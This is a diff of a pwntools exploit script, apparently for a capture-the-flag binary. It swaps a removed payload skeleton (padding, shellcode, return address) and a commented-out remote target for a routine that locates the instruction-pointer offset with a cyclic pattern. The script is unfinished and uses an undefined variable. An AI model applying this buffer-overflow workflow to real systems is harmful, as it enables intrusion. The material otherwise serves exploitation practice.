@@ -3,20 +3,26 @@ from pwn import *
 import sys
 context.log_level = 'DEBUG'
 context(os='linux', arch='amd64')
-e = context.binary = ELF("./pwn")
-p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
-+"\nbreak *main+116"
-+"\nc"
+exe = './pwn'
+e = context.binary = ELF(exe, checksec=False)
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+p = e.debug(gdbscript='''
+source /home/nick/global/halfdisp.py
+break *main
+c
+'''
 )
-p = elf.debug()
+def find_ip(payload):
+    p = process(exe)
+    p.sendlineafter(b"we're using read()!", payload)
+    p.wait()
+    # ip_offset = cyclic_find(p.corefile.pc)  # x86
+    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return ip_offset
 
-libc = ELF("./glibc/libc.so.6")
-exe = ELF("./pwn")
-rop = ROP(exe)
-payload = flat([
-padding,
-shellcode,
-stack_addr
-])
-#p = pwn.remote("94.237.53.3",45701)
+offset = find_ip(cyclic(x))
+
+
+
 p.interactive()
